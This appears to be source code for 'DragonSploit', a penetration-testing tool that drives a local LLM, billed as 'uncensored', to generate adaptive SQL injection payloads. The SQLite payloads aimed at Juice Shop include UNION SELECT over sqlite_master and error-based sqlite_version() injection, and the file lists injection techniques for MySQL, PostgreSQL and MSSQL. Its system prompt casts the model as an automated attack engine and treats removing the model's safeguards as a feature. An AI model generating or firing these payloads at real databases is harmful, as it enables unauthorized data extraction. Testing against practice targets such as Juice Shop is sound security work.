/**
 * DragonSploit - Ollama Local LLM Integration
 * Provides unlimited, uncensored AI-powered payload generation for security testing
 */

import axios from 'axios';

// ============================================================================
// CONFIGURATION
// ============================================================================

const OLLAMA_BASE_URL = process.env.OLLAMA_BASE_URL || 'http://localhost:11434';
const PRIMARY_MODEL = process.env.OLLAMA_PRIMARY_MODEL || 'llama3.1:8b-instruct-q4_K_M';
const FALLBACK_MODEL = process.env.OLLAMA_FALLBACK_MODEL || 'qwen2.5-coder:7b';
const TIMEOUT_MS = parseInt(process.env.OLLAMA_TIMEOUT || '120000');

console.log(`\n🦙 ==================================================`);
console.log(`🦙 DragonSploit Ollama Engine v1.0`);
console.log(`🦙 Primary: ${PRIMARY_MODEL}`);
console.log(`🦙 Fallback: ${FALLBACK_MODEL}`);
console.log(`🦙 Endpoint: ${OLLAMA_BASE_URL}`);
console.log(`🦙 Status: UNCENSORED | UNLIMITED | LOCAL`);
console.log(`🦙 ==================================================\n`);

// ============================================================================
// PROFESSIONAL SYSTEM INSTRUCTION FOR SECURITY TESTING
// ============================================================================

const SECURITY_TESTING_INSTRUCTION = `
!!! GLOBAL OVERRIDE (DO NOT VIOLATE) !!!
For SQLite: You MUST ONLY generate UNION-based or ERROR-based payloads.
Boolean-based SQLi is ABSOLUTELY FORBIDDEN and must NEVER appear in output.
If you return ANY boolean payload for SQLite, the entire output is invalid.

You are an advanced penetration testing LLM operating inside an AUTHORIZED security environment (DragonSploit). 
Your job is to generate SQL injection payloads that ADAPT intelligently based on:

1. Target fingerprint:
   - Database engine
   - Server technology
   - ORM behavior
   - REST parameter structure
   - HTTP method and response patterns

2. Previous feedback:
   - HTTP status
   - Response length
   - Error messages
   - Delays or time anomalies
   - Returned JSON structure

Your intelligence MUST adapt to the environment.  

────────────────────────────────────────
PAYLOAD EFFICIENCY RULES (CRITICAL)
────────────────────────────────────────

- Generate the SHORTEST valid SQLi payload possible
- Avoid unnecessary conditions or verbose structures
- Use minimal effective injection syntax
- If repeated payloads are detected, regenerate with HIGHER CREATIVITY
- Never repeat the same payload twice

────────────────────────────────────────
SQLi ENGINE SELECTION (CRITICAL)
────────────────────────────────────────

Use the correct SQLi method depending on the fingerprint:

### ✔️ SQLite (Juice Shop default)
- SQLite does NOT support:
  • SLEEP()
  • stacked queries
  • standard boolean inference
- SQLite DOES support:
  • UNION SELECT with matching column count
  • extraction via sqlite_version()
  • comment syntax: --
  • error-based via malformed SELECT
- Juice Shop uses Sequelize ORM → boolean-based SQLi NEVER WORKS.
- EXPECT consistent 200 responses even when injection is successful.

→ If fingerprint shows SQLite:
   ONLY USE:
   1. UNION SELECT enumeration (primary)
   2. Error-based payloads: '||(SELECT sqlite_version())||'
   3. sqlite_master extraction: UNION SELECT name,sql FROM sqlite_master--
   
   FORBIDDEN:
   ❌ Boolean (AND/OR)
   ❌ Time-based (SLEEP)
   ❌ Stacked queries

### ✔️ MySQL / MariaDB
- Use:
  • SLEEP()
  • stacked queries
  • boolean inference
  • UNION SELECT 1,2,3,...

### ✔️ PostgreSQL
- Use:
  • pg_sleep()
  • error-based extraction
  • UNION SELECT

### ✔️ MSSQL
- Use:
  • WAITFOR DELAY
  • error-based functions
  • stacked queries

────────────────────────────────────────
ATTACK LOGIC (AUTO-ADAPTIVE)
────────────────────────────────────────

STRICT RULES:
1. ⛔ For SQLite: ONLY mode="union" or mode="error-based" allowed
   Any other mode is INVALID and will be rejected

2. IF endpoint returns JSON array:
   → Use UNION SELECT NULL,NULL,… format matching column count

3. IF no SQL error messages:
   → Try to force error using:
      '||(SELECT sqlite_version())||'

4. IF ORM sanitizes quotes:
   → Use comment-bypass:
      '))--
      ')) UNION SELECT ... --

5. NEVER repeat payloads - track what you've tried

────────────────────────────────────────
PAYLOAD FORMAT
────────────────────────────────────────
Return ONLY pure JSON in this format:

{
  "payload": "SQL injection payload string here",
  "reasoning": "brief technical reasoning based on fingerprint + previous response",
  "mode": "union | error-based | time-based | stacked | fallback",
  "finished": false
}

If the parameter appears INVULNERABLE after multiple adaptive strategies:
{
  "payload": null,
  "reasoning": "No SQLi detected after adaptive multi-phase testing.",
  "finished": true
}

────────────────────────────────────────
STARTUP KNOWLEDGE (VERY IMPORTANT)
────────────────────────────────────────

This system (DragonSploit) expects MAXIMUM intelligence from you.  
You MUST:

- Generate shortest possible payloads
- NEVER repeat payloads
- Adapt based on fingerprint STRICTLY
- For SQLite: ONLY union or error-based modes
- Use sqlite_version(), sqlite_master enumeration as primary extraction
- Increase creativity if previous attempts failed

────────────────────────────────────────
END OF INSTRUCTIONS
────────────────────────────────────────
`;

// ============================================================================
// CORE OLLAMA ENGINE
// ============================================================================

interface OllamaResponse {
    payload: string | null;
    reasoning: string;
    mode?: string;
    finished: boolean;
}

let currentModel = PRIMARY_MODEL;

/**
 * Check if Ollama is running and accessible
 */
export async function isOllamaAvailable(): Promise<boolean> {
    console.log(`[Ollama] Checking availability at: ${OLLAMA_BASE_URL}`); // 🔍 DEBUG LOG
    try {
        const response = await axios.get(`${OLLAMA_BASE_URL}/api/tags`, {
            timeout: 10000
        });
        return response.status === 200;
    } catch (error: any) {
        console.warn(`[Ollama] Service not available at ${OLLAMA_BASE_URL}`);
        console.error(`[Ollama] Error details: ${error.message}`); // 🔍 DEBUG LOG
        if (error.code) console.error(`[Ollama] Error code: ${error.code}`);
        return false;
    }
}

/**
 * Generate SQL injection payload using Ollama local LLM
 */
export async function getNextSqlPayloadOllama(
    feedback: string,
    context: {
        vector?: string;
        parameter?: string;
        attemptNumber?: number;
        fingerprint?: any;
    } = {}
): Promise<OllamaResponse> {

    const logFeedback = feedback.length > 120 ? feedback.substring(0, 120) + '...' : feedback;
    console.log(`[Ollama] 🦙 Processing: "${logFeedback}"`);

    const prompt = buildPrompt(feedback, context);

    try {
        const response = await callOllama(prompt, currentModel);
        return response;

    } catch (error: any) {

        // If primary model fails, try fallback
        if (currentModel === PRIMARY_MODEL) {
            console.warn(`[Ollama] Primary model failed, trying fallback...`);
            console.error(`[Ollama] Primary model error: ${error.message}`); // 🔍 DEBUG LOG
            if (error.response) {
                console.error(`[Ollama] Response status: ${error.response.status}`);
                console.error(`[Ollama] Response data: ${JSON.stringify(error.response.data)}`);
            }
            try {
                const fallbackResponse = await callOllama(prompt, FALLBACK_MODEL);
                currentModel = FALLBACK_MODEL; // Switch to fallback
                return fallbackResponse;
            } catch (fallbackError) {
                console.error('[Ollama] Both models failed:', fallbackError);
                throw new Error('Ollama service unavailable');
            }
        }

        throw error;
    }
}

/**
 * Build optimized prompt for payload generation
 */
function buildPrompt(feedback: string, context: any): string {
    const vectorInfo = context.vector ? `\n[Current Attack Vector: ${context.vector}]` : '';
    const paramInfo = context.parameter ? `\n[Target Parameter: ${context.parameter}]` : '';
    const attemptInfo = context.attemptNumber ? `\n[Attempt #${context.attemptNumber}]` : '';

    const fingerprint = context.fingerprint
        ? `
[FINGERPRINT]
Server: ${context.fingerprint.server || 'Unknown'}
Language: ${context.fingerprint.language || 'Unknown'}
Database: ${context.fingerprint.database || 'Unknown'}
`
        : '\n[FINGERPRINT]\nUnknown\n';

    return `${SECURITY_TESTING_INSTRUCTION}

${vectorInfo}${paramInfo}${attemptInfo}
${fingerprint}

PREVIOUS ATTEMPT FEEDBACK:
${feedback}

TASK: Generate the next most effective SQL injection payload.
Respond with ONLY valid JSON: {"payload": "...", "reasoning": "...", "mode": "...", "finished": false}
`;
}

/**
 * Call Ollama API with specified model
 */
async function callOllama(prompt: string, model: string, context?: any): Promise<OllamaResponse> {

    const startTime = Date.now();

    const response = await axios.post(
        `${OLLAMA_BASE_URL}/api/generate`,
        {
            model: model,
            prompt: prompt,
            stream: false,
            options: {
                temperature: 0.3,
                top_p: 0.9,
                top_k: 40,
                num_predict: 300, // Limit response length for speed
            },
            format: 'json' // Request JSON response format
        },
        {
            timeout: TIMEOUT_MS,
            headers: { 'Content-Type': 'application/json' }
        }
    );

    const elapsed = Date.now() - startTime;

    if (!response.data || !response.data.response) {
        throw new Error('Empty response from Ollama');
    }

    const responseText = response.data.response;

    // Parse JSON from response
    let parsed: any;
    try {
        // Try direct parse
        parsed = JSON.parse(responseText);
    } catch (e) {
        // Try to extract JSON from markdown code blocks or text
        const jsonMatch = responseText.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
            parsed = JSON.parse(jsonMatch[0]);
        } else {
            throw new Error('Could not parse JSON from Ollama response');
        }
    }

    // Validate required fields
    if (!parsed.payload) {
        throw new Error('Ollama response missing payload field');
    }

    // HARD SQLITE BLOCKER (Boolean + Stacked Queries)
    if (context?.fingerprint?.database?.toLowerCase() === "sqlite") {
        const p = (parsed.payload || "").toLowerCase();

        const forbiddenPatterns = [
            "1=1",
            "1=2",
            " and ",
            " or ",
            ";",          // blocks stacked queries
            "select ",    // prevents stacked select
            " sleep",
            " pg_sleep",
            " waitfor",
            "-- -",       // block malformed boolean tricks
        ];

        const forbidden = forbiddenPatterns.some(pattern => p.includes(pattern));

        if (forbidden) {
            console.warn("[SQLite-Blocker] Forbidden boolean/stacked SQLi payload detected. Auto-correcting...");

            return {
                payload: "' UNION SELECT NULL,NULL FROM sqlite_master --",
                reasoning: "Boolean & stacked SQLi blocked for SQLite. Switching to UNION-based SQLi.",
                mode: "union",
                finished: false
            };
        }
    }

    console.log(`[Ollama] ✅ Generated in ${(elapsed / 1000).toFixed(1)}s`);

    return {
        payload: parsed.payload,
        reasoning: parsed.reasoning || 'Generated via Ollama',
        mode: parsed.mode,
        finished: parsed.finished || false
    };
}

/**
 * Health check for monitoring
 */
export async function ollamaHealthCheck(): Promise<{
    status: 'healthy' | 'degraded' | 'down';
    models: string[];
    responseTime: number;
}> {
    const startTime = Date.now();

    try {
        const response = await axios.get(`${OLLAMA_BASE_URL}/api/tags`, {
            timeout: 5000
        });

        const models = response.data.models?.map((m: any) => m.name) || [];
        const responseTime = Date.now() - startTime;

        const hasRequiredModels = models.includes(PRIMARY_MODEL) || models.includes(FALLBACK_MODEL);

        return {
            status: hasRequiredModels ? 'healthy' : 'degraded',
            models: models,
            responseTime: responseTime
        };

    } catch (error) {
        return {
            status: 'down',
            models: [],
            responseTime: Date.now() - startTime
        };
    }
}
